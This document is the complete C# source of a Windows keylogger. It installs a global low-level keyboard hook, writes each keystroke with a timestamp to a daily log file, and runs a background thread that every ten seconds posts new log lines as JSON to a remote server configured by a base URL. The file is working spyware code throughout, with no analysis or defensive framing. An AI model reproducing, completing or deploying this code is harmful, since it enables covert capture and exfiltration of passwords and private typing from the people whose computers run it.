using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Net.Http;
using System.Configuration;

using Newtonsoft.Json;

namespace Keylog
{
    class Program
    {
        private static string _logName;
        private static int _lastReadLineNumber = 0;

        private static HttpClient httpClient;

        private static bool _hasCapturedKeys = false;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                WriteLog(vkCode);
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);

        }

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        static void WriteLog(int vkCode)
        {
            _logName = $"Log_{DateTime.Now.ToLongDateString()}.txt";
            using (StreamWriter streamWriter = new StreamWriter(_logName, true))
            {
                streamWriter.WriteLine($"{DateTime.Now.ToLongTimeString()} {(Keys)vkCode}");
                _hasCapturedKeys = true;
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
           LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public static void StartTimer()
        {
            Thread thread = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(10000);
                    if (_hasCapturedKeys)
                    {
                        int currentLogLineNumber = _lastReadLineNumber;
                        bool sendSuccess = SendLogToServer().Result;

                        if (!sendSuccess)
                        {
                            _lastReadLineNumber = currentLogLineNumber;
                        }
                        Console.WriteLine($"Send to server {(sendSuccess ? "success" : "fail")}");
                    }
                }
            });

            thread.IsBackground = true;
            thread.Start();
        }

        public static List<string> ReadLogLines(int numberOfLines = 100)
        {
            List<string> lines = new List<string>();
            try
            {
                lines = File.ReadLines(_logName).Skip(_lastReadLineNumber).Take(numberOfLines).ToList();
                _lastReadLineNumber += lines.Count;
            }
            catch
            {
            }

            return lines;
        }

        public static async Task<bool> SendLogToServer()
        {
            if (httpClient == null)
            {
                httpClient = new HttpClient();
            }

            try
            {
                var endpoint = $"{ConfigurationManager.AppSettings["baseUrl"]}/logs";
                var request = new HttpRequestMessage(HttpMethod.Post, endpoint);

                var logLines = ReadLogLines();

                if (logLines.Count == 0)
                {
                    return false;
                }

                var data = JsonConvert.SerializeObject(new { name = _logName, data = logLines });                
                request.Content = new StringContent(data, Encoding.UTF8, "application/json");

                var response = await httpClient.SendAsync(request);
                response.EnsureSuccessStatusCode();

                return true;
            } catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }
        }

        static void Main(string[] args)
        {
            StartTimer();
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
    }
}
